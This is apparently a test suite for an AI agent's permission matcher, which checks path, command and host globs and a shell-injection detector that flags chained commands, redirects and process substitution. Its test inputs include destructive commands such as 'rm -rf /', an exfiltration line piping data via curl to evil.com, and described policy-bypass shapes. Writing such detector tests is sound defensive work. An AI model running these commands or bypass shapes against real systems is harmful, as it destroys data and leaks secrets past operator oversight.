import { describe, expect, test } from 'bun:test';
import {
  containsShellInjection,
  escapeGlobMetacharacters,
  firstMatchingCommand,
  firstMatchingHost,
  firstMatchingPath,
  matchCommand,
  matchHost,
  matchPath,
} from '../../src/permissions/matcher.ts';

const CWD = '/proj';

describe('matchPath', () => {
  test('exact relative match', () => {
    expect(matchPath('src/foo.ts', 'src/foo.ts', CWD)).toBe(true);
  });

  test('relative pattern matches relative target', () => {
    expect(matchPath('src/**', 'src/a/b.ts', CWD)).toBe(true);
  });

  test('relative pattern matches absolute target inside cwd', () => {
    expect(matchPath('src/**', '/proj/src/a/b.ts', CWD)).toBe(true);
  });

  test('relative pattern does NOT match path outside cwd', () => {
    expect(matchPath('src/**', '/etc/passwd', CWD)).toBe(false);
  });

  test('absolute pattern matches absolute target outside cwd', () => {
    expect(matchPath('/etc/**', '/etc/passwd', CWD)).toBe(true);
  });

  test('deny pattern with leading wildcard', () => {
    expect(matchPath('**/.env*', '.env.local', CWD)).toBe(true);
    expect(matchPath('**/.env*', 'src/.env.local', CWD)).toBe(true);
    expect(matchPath('**/.env*', 'src/foo.ts', CWD)).toBe(false);
  });

  test('dot-prefixed cwd-relative pattern', () => {
    expect(matchPath('./src/**', 'src/foo.ts', CWD)).toBe(true);
  });
});

describe('matchCommand', () => {
  test('exact match', () => {
    expect(matchCommand('git status', 'git status')).toBe(true);
  });

  test('exact pattern does NOT match suffix', () => {
    expect(matchCommand('git status', 'git statusxyz')).toBe(false);
  });

  test('trailing wildcard matches arguments', () => {
    expect(matchCommand('git push *', 'git push origin main')).toBe(true);
  });

  test('does NOT match different command with shared prefix', () => {
    expect(matchCommand('git status', 'gitstatus')).toBe(false);
  });

  test('trims input whitespace', () => {
    expect(matchCommand('ls', '  ls  ')).toBe(true);
  });

  test('* matches any character including spaces', () => {
    expect(matchCommand('rm -rf *', 'rm -rf / --no-preserve-root')).toBe(true);
  });

  test('* matches across newlines (multi-line bash commands)', () => {
    // bash tool accepts multi-line commands. Without dotAll, the `.`
    // in our regex would skip `\n` and policy rules like `*` or
    // `bash -c *` would fall through to default deny on heredocs and
    // multi-line scripts.
    expect(matchCommand('*', 'echo a\necho b')).toBe(true);
    expect(matchCommand('python -c *', 'python -c "for i in range(3):\n  print(i)"')).toBe(true);
    expect(matchCommand('cat <<EOF\n*\nEOF', 'cat <<EOF\nhello\nworld\nEOF')).toBe(true);
  });

  test('? matches a single character including newline', () => {
    expect(matchCommand('a?b', 'a\nb')).toBe(true);
  });

  test('backslash-escaped wildcards match literally', () => {
    // `\\*` means literal `*`, not "any chars". Used by the
    // session-allow bridge to promote `args.command` as a literal
    // exact-match rule. Without this, a session rule for `echo *`
    // would broaden to "any echo invocation" via the dotAll regex.
    expect(matchCommand('echo \\*', 'echo *')).toBe(true);
    expect(matchCommand('echo \\*', 'echo file.txt')).toBe(false);
    expect(matchCommand('echo \\*', 'echo $(rm -rf /)')).toBe(false);
    // `\\?` means literal `?`.
    expect(matchCommand('cmd \\?', 'cmd ?')).toBe(true);
    expect(matchCommand('cmd \\?', 'cmd a')).toBe(false);
    // `\\\\` means literal backslash.
    expect(matchCommand('cmd \\\\', 'cmd \\')).toBe(true);
    // Mixing literal and wildcard: `echo \\* *` means "echo *"
    // followed by anything.
    expect(matchCommand('echo \\* *', 'echo * extra')).toBe(true);
    expect(matchCommand('echo \\* *', 'echo file extra')).toBe(false);
  });
});

describe('escapeGlobMetacharacters', () => {
  test('escapes *, ?, and backslash so the result matches literally via matchCommand', () => {
    // Round-trip: any literal string, escaped then matched
    // against itself, must match. This is the contract the
    // session-allow bridge depends on.
    const literals = [
      'echo *',
      'rm -rf .',
      'cmd ?',
      'echo $(date)',
      'git push origin main',
      'cmd \\',
      'multi\nline',
    ];
    for (const s of literals) {
      expect(matchCommand(escapeGlobMetacharacters(s), s)).toBe(true);
    }
  });

  test('escaped literal does NOT match other commands', () => {
    expect(matchCommand(escapeGlobMetacharacters('echo *'), 'echo file')).toBe(false);
    expect(matchCommand(escapeGlobMetacharacters('echo *'), 'echo $(rm -rf /)')).toBe(false);
  });

  test('strings without metachars pass through unchanged', () => {
    // No-op for the common case; pin so a future broader regex
    // doesn't accidentally escape printable chars.
    expect(escapeGlobMetacharacters('git status')).toBe('git status');
    expect(escapeGlobMetacharacters('npm test --watch')).toBe('npm test --watch');
  });

  test('all three meta chars escaped', () => {
    expect(escapeGlobMetacharacters('*')).toBe('\\*');
    expect(escapeGlobMetacharacters('?')).toBe('\\?');
    expect(escapeGlobMetacharacters('\\')).toBe('\\\\');
  });
});

describe('matchHost', () => {
  test('exact host match', () => {
    expect(matchHost('localhost', 'localhost')).toBe(true);
    expect(matchHost('localhost', 'example.com')).toBe(false);
  });

  test('case-insensitive', () => {
    expect(matchHost('Example.COM', 'example.com')).toBe(true);
  });

  test('glob pattern for subdomains', () => {
    expect(matchHost('*.internal', 'api.internal')).toBe(true);
    expect(matchHost('*.internal', 'api.public.com')).toBe(false);
  });
});

describe('containsShellInjection', () => {
  test('plain commands are not flagged', () => {
    expect(containsShellInjection('ls')).toBe(false);
    expect(containsShellInjection('git status')).toBe(false);
    expect(containsShellInjection('git log --oneline -10')).toBe(false);
    expect(containsShellInjection('rm -rf ./build')).toBe(false);
  });

  test('semicolon flags', () => {
    expect(containsShellInjection('ls; rm -rf .')).toBe(true);
    expect(containsShellInjection('git status; pwd')).toBe(true);
  });

  test('logical AND/OR chain flags', () => {
    expect(containsShellInjection('test -f x && rm x')).toBe(true);
    expect(containsShellInjection('mkdir -p dir || echo skip')).toBe(true);
  });

  test('pipe flags', () => {
    expect(containsShellInjection('git log | head')).toBe(true);
    expect(containsShellInjection('cat file | grep foo')).toBe(true);
  });

  test('command substitution flags', () => {
    expect(containsShellInjection('echo $(whoami)')).toBe(true);
    expect(containsShellInjection('cat $(find . -name secret)')).toBe(true);
    expect(containsShellInjection('rm `which dangerous`')).toBe(true);
  });

  test('metachars inside single quotes are NOT flagged', () => {
    // git commit -m "fix; bug" — semicolon is literal inside the
    // quoted message. Single quotes preserve everything.
    expect(containsShellInjection("echo 'foo; bar'")).toBe(false);
    expect(containsShellInjection("echo 'a | b'")).toBe(false);
    expect(containsShellInjection("echo 'a && b'")).toBe(false);
  });

  test('metachars inside double quotes are NOT flagged', () => {
    // Double-quoted strings still allow $(...) expansion in real
    // bash, but for the policy decision we treat double-quoted
    // segments as opaque content. The deny path catches the
    // catastrophic shapes regardless; this guard is the defense
    // for accidental compounds, not a sandbox.
    expect(containsShellInjection('echo "foo; bar"')).toBe(false);
    expect(containsShellInjection('git commit -m "fix; close #1"')).toBe(false);
  });

  test('escaped metachars are NOT flagged', () => {
    expect(containsShellInjection('echo foo\\; bar')).toBe(false);
    expect(containsShellInjection('echo a\\|b')).toBe(false);
  });

  test('mixed quote / unquoted: unquoted metachar still flags', () => {
    // The injection IS the unquoted part — operator must see
    // this on the modal.
    expect(containsShellInjection('echo "safe text"; rm -rf .')).toBe(true);
    expect(containsShellInjection("git status -m 'msg' && rm")).toBe(true);
  });

  test('lone & flags (async control operator separates commands)', () => {
    // Bash's `&` is structurally a compound separator: `cmd1 & cmd2`
    // backgrounds cmd1 and immediately runs cmd2. An allow rule
    // like `git status*` would otherwise admit `git status & rm
    // -rf /tmp/...`. Trailing-only `&` (no second command) also
    // flags — operator's `sleep 30 &` is no different in shape from
    // `sleep 30 & rm`, and the policy gate prefers a confirm.
    // Operator who genuinely needs background can session-allow
    // the literal pattern.
    expect(containsShellInjection('sleep 30 &')).toBe(true);
    expect(containsShellInjection('git status & rm -rf /tmp/pwn')).toBe(true);
    expect(containsShellInjection('a&b')).toBe(true);
  });

  test('fd duplication / closure (no filesystem write) does NOT flag', () => {
    // Bash forms that legitimately contain `&` adjacent to `>` or
    // `<` AND don't touch the filesystem:
    //   - `2>&1` / `>&1` / `<&3` — fd duplication
    //   - `>&-` / `<&-`          — fd close
    //   - `>&12` / `<&10`        — multi-digit fd ref
    // Forcing confirm on every `2>&1` would make stderr-merging
    // unusable through the gate without a session-allow promotion.
    expect(containsShellInjection('echo foo 2>&1')).toBe(false);
    expect(containsShellInjection('cmd >&2')).toBe(false);
    expect(containsShellInjection('cmd <&3')).toBe(false);
    expect(containsShellInjection('cmd >&-')).toBe(false);
    expect(containsShellInjection('cmd <&-')).toBe(false);
    expect(containsShellInjection('cmd >&12')).toBe(false);
  });

  test('>&word (word not a digit/-) flags as file write (bash legacy &>word form)', () => {
    // Per bash(1) "REDIRECTING STANDARD OUTPUT AND STANDARD
    // ERROR": when `>&word` is followed by something that is NOT
    // a digit or `-`, it's equivalent to `&>word` — redirects
    // both stdout AND stderr to file `word`. The previous
    // matcher always treated `>&` as fd duplication, missing
    // this case and creating a bypass: an allow like `git diff
    // --*` admits `git diff --name-only >&/tmp/out`.
    expect(containsShellInjection('cmd >&/tmp/out')).toBe(true);
    expect(containsShellInjection('git diff --name-only >&/tmp/out')).toBe(true);
    expect(containsShellInjection('cmd >&log.txt')).toBe(true);
    // No char after `>&` (truncated input) — bash error in
    // practice; conservative flag.
    expect(containsShellInjection('cmd >&')).toBe(true);
    // Whitespace after `>&` — bash parses it as separate tokens;
    // conservative flag (operator's bash typo, not a real fd dup).
    expect(containsShellInjection('cmd >& 1')).toBe(true);
  });

  test('fd-prefixed `1>&word` (legacy redirect) flags', () => {
    // `1>&out` is the canonical fd-1-prefixed legacy bash form
    // of "redirect stdout to file out". The fd prefix (`1`) is
    // before the `>&`, so the `after` byte tracked by the matcher
    // is the char following `&` (`o`), not the `1`. Flag.
    expect(containsShellInjection('cmd 1>&out')).toBe(true);
    expect(containsShellInjection('cmd 2>&err.log')).toBe(true);
    // But fd-prefixed dup (`1>&2`) still skips — the `after` is
    // the digit `2`.
    expect(containsShellInjection('cmd 1>&2')).toBe(false);
    expect(containsShellInjection('cmd 2>&1')).toBe(false);
  });

  test('output redirection to file flags (mutation)', () => {
    // The init template's bash allowlist deliberately ships
    // read-only patterns (`git status -*`, `ls -*`, etc). Bash
    // redirection turns any of those into silent file mutation
    // — `git status --short > /tmp/secrets` matches `git status
    // -*` and would auto-allow a write operator. The guard flags
    // every form of file write so the operator sees the modal.
    expect(containsShellInjection('git status > /tmp/out')).toBe(true);
    expect(containsShellInjection('echo foo >>log')).toBe(true);
    expect(containsShellInjection('cmd >|file')).toBe(true);
    expect(containsShellInjection('ls -la >dir.txt')).toBe(true);
    // No space between operator and target — same shape, must flag.
    expect(containsShellInjection('git diff>/tmp/d.patch')).toBe(true);
  });

  test('bash &> / &>> (stdout+stderr to file) flags', () => {
    // `&>file` and `&>>file` are bash extensions that redirect
    // both streams to a file. File mutation. Previously the
    // matcher treated `&>` as a redirection operator (skip) —
    // false negative for the mutation check. Now flags.
    expect(containsShellInjection('cmd &>file')).toBe(true);
    expect(containsShellInjection('cmd &>>file')).toBe(true);
    expect(containsShellInjection('build &>/tmp/build.log')).toBe(true);
  });

  test('<> (read+write) flags', () => {
    // `<>FILE` opens FILE for read AND write. Counts as mutation
    // because the file is created if missing.
    expect(containsShellInjection('cmd <>file')).toBe(true);
  });

  test('stdin redirection from file does NOT flag (read only, no mutation)', () => {
    // `<FILE`, `<<EOF`, `<<<X` — none of these write to the
    // filesystem. The host command's bash allow rule already
    // authorized stdin handling. Heredoc body content scans
    // normally; if it contains `;` or `\n` separators, those
    // flag — which is acceptable conservative behavior.
    expect(containsShellInjection('cmd <input.txt')).toBe(false);
    expect(containsShellInjection('cmd <<<"here-string"')).toBe(false);
  });

  test('redirection inside quotes does NOT flag', () => {
    // Operator's commit message containing `>` is a literal, not
    // a redirect.
    expect(containsShellInjection('git commit -m "fix: x > y"')).toBe(false);
    expect(containsShellInjection("echo 'a > b'")).toBe(false);
  });

  test('escaped redirect operators do NOT flag', () => {
    // `\\>` and `\\<` are literal characters, not redirects.
    expect(containsShellInjection('echo a\\>b')).toBe(false);
    expect(containsShellInjection('echo a\\<b')).toBe(false);
  });

  test('& after a redirection target does flag (separator, not part of redirect)', () => {
    // `cmd >file & cmd2` — redirect to file, then background-chain
    // to cmd2. The `&` is NOT preceded by `>` or `<` directly
    // (whitespace and the filename came in between), so the
    // separator semantics still apply.
    expect(containsShellInjection('cmd >file & cmd2')).toBe(true);
    expect(containsShellInjection('cmd 2>err & rm')).toBe(true);
  });

  test('& inside quotes does NOT flag (literal in string)', () => {
    expect(containsShellInjection("echo 'a & b'")).toBe(false);
    expect(containsShellInjection('echo "a & b"')).toBe(false);
  });

  test('escaped & does NOT flag', () => {
    expect(containsShellInjection('echo a\\&b')).toBe(false);
  });

  test('backslash inside single quotes is literal — does NOT consume the closing quote', () => {
    // Bash single quotes preserve every character verbatim,
    // including backslash. The previous scanner unconditionally
    // consumed `\\` + next char, so `'\\'` was treated as
    // `'\` + skip — leaving inSingle stuck at true and silently
    // hiding the closing `'` and any following separator.
    // Concrete bypass: `echo '\\'; rm -rf /tmp/pwn` is a real
    // compound (literal-backslash-string, then `;` separator,
    // then a destructive command). Must flag.
    expect(containsShellInjection("echo '\\'; rm -rf /tmp/pwn")).toBe(true);
    expect(containsShellInjection("echo '\\' && rm")).toBe(true);
    // Multiple backslashes inside single quote — same property.
    expect(containsShellInjection("echo '\\\\\\\\' ; pwd")).toBe(true);
    // Counter-test: backslash-then-non-quote inside single quote
    // doesn't make us flag spuriously. The single quote stays
    // closed where it should.
    expect(containsShellInjection("echo 'a\\b'")).toBe(false);
    expect(containsShellInjection("echo 'a\\nb'")).toBe(false);
    // Backslash-escape outside single quotes still works (escaped
    // metachars don't flag).
    expect(containsShellInjection('echo a\\;b')).toBe(false);
  });

  test('newline as command separator flags', () => {
    // Bash treats `\n` like `;`. The matcher compiles glob `*` to
    // regex `.*` with dotAll, so an allow pattern like
    // `git status -*` would otherwise match
    // `git status -s\nrm -rf /tmp/pwn` and silently authorize the
    // second line. The guard must catch raw newline regardless of
    // how the agent emitted the command (multi-line literal,
    // string-marshaled `\n`, etc.).
    expect(containsShellInjection('git status -s\nrm -rf /tmp/pwn')).toBe(true);
    expect(containsShellInjection('ls\necho pwned')).toBe(true);
    expect(containsShellInjection('foo\rbar')).toBe(true);
    expect(containsShellInjection('foo\r\nbar')).toBe(true);
  });

  test('newline inside single quotes does NOT flag (literal multi-line string)', () => {
    // Bash preserves newlines inside single-quoted strings as
    // literal characters, not separators. A multi-line commit
    // message via -m '...' should not trip the detector.
    expect(containsShellInjection("git commit -m 'line1\nline2'")).toBe(false);
  });

  test('newline inside double quotes does NOT flag (literal multi-line string)', () => {
    // Same property as single quotes for newline. Bash still
    // performs $() expansion inside double quotes, but the
    // detector already covers `$(` separately.
    expect(containsShellInjection('echo "line1\nline2"')).toBe(false);
  });

  test('backslash-newline (line continuation) does NOT flag', () => {
    // `\\\n` is the standard bash line-continuation: the joined
    // line is one logical command. The escape rule consumes the
    // backslash + newline together, so the scanner sees a
    // continuous unquoted run with no separator. Operator's
    // `git status -s \\\n  --porcelain` should pass without a
    // false-positive confirm.
    expect(containsShellInjection('git status -s \\\n  --porcelain')).toBe(false);
  });

  test('escaped newline in unquoted context does NOT flag', () => {
    // The escape rule applies to any character following `\\`,
    // including the literal sequence `\\\n` in the source string.
    expect(containsShellInjection('echo foo\\\nbar')).toBe(false);
  });

  test('process substitution <(...) and >(...) flags', () => {
    // Same security shape as $(...): the inner command runs in a
    // subshell. Without flagging, an allow like `cat *` admits
    // `cat <(rm -rf /tmp/pwn)` because no standard separator
    // appears in the input.
    expect(containsShellInjection('cat <(rm -rf /tmp/pwn)')).toBe(true);
    expect(containsShellInjection('tee >(curl evil.com -d @-)')).toBe(true);
    expect(containsShellInjection('diff <(cmd1) <(cmd2)')).toBe(true);
    // With fd prefix
    expect(containsShellInjection('cmd 2>(rm -rf /tmp)')).toBe(true);
  });

  test('process substitution inside quotes does NOT flag', () => {
    expect(containsShellInjection("echo 'foo <(bar)'")).toBe(false);
    expect(containsShellInjection('echo "foo <(bar)"')).toBe(false);
  });

  test('escaped < before ( does NOT trigger process-sub flag', () => {
    // `\\<(...)` means literal `<` then bare `(`. The escape rule
    // resets the redirection-context flag so `(` doesn't get
    // mis-tagged as process substitution.
    expect(containsShellInjection('echo \\<(literal)')).toBe(false);
  });

  test('plain ( without preceding redirect does NOT flag', () => {
    // Bare `(cmd)` is a subshell group that requires a preceding
    // separator (`;`, `\n`, etc.) to be reached as its own command;
    // bash parse-errors otherwise. The matcher only flags `(` when
    // it follows `<` or `>`.
    expect(containsShellInjection('echo (literal text)')).toBe(false);
  });

  test('redirect with whitespace before ( still flags as a redirect (write)', () => {
    // `cmd > (stuff)` isn't process substitution (bash requires
    // `<(` or `>(` adjacent), but the `>` itself is a write
    // redirect with whatever follows as the target — flags
    // regardless. Real bash parse-errors on this input; the
    // policy gate flagging conservatively is fine.
    expect(containsShellInjection('cmd > (stuff)')).toBe(true);
  });
});

describe('first* helpers', () => {
  test('firstMatchingPath returns the matching pattern', () => {
    expect(firstMatchingPath(['src/**', 'tests/**'], 'tests/a.ts', CWD)).toBe('tests/**');
    expect(firstMatchingPath(['src/**'], 'docs/a.md', CWD)).toBeNull();
  });

  test('firstMatchingCommand returns first match in order', () => {
    expect(firstMatchingCommand(['ls', 'ls *'], 'ls -la')).toBe('ls *');
  });

  test('firstMatchingHost returns null for empty patterns', () => {
    expect(firstMatchingHost(undefined, 'example.com')).toBeNull();
    expect(firstMatchingHost([], 'example.com')).toBeNull();
  });
});
